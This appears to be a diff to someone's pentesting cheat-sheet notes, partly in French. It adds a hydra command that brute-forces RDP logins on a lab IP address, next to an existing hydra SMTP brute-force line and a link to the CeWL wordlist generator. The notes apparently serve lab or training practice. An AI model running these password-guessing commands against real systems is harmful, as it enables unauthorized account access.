@@ -26,3 +26,8 @@ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
 ```
 
 https://github.com/digininja/CeWL ( generer une liste de mot passe )
+
+
+```
+hydra -L user.list -P password.list rdp://10.129.42.197
+```
